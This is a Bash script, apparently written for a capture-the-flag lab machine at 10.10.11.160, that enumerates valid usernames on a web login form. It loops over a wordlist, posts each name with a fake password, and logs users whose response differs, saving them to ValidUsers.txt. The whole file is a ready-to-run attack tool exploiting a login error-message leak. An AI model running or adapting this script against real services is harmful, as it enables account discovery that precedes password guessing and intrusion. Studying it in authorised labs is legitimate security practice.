#!/bin/bash
#Author: Conde

#Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


#Control + c
trap ctrl_c INT

function ctrl_c(){

	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Exiting...${endColour}"; sleep 1
	tput cnorm; exit 1
}

#Hide cursor
tput civis

#Variables
URL="http://10.10.11.160:5000/login"

#Delete file if exists
[ -f ValidUsers.txt ] && rm ValidUsers.txt

if [ $1 ]; then
	#Main Program
	echo -e "\n${blueColour}[*] Finding Valid Users \n${endColour}"
	for user in $(cat $1); do

		status=$(timeout 1 curl -s -d "username=$user&password=F4kEP4sS" $URL | grep -o 'Invalid login')

		if  [[ $status ]]; then
			echo -e "\t${greenColour}[✔] User found: ${yellowColour}$user${endColour}"
			echo "$user" >> ValidUsers.txt
		fi
	done; tput cnorm
else
	echo -e "\n${greenColour}[*] Uso: ${blueColour}$0 <UserDiccionary>${endColour}"
	tput cnorm; exit 1
fi
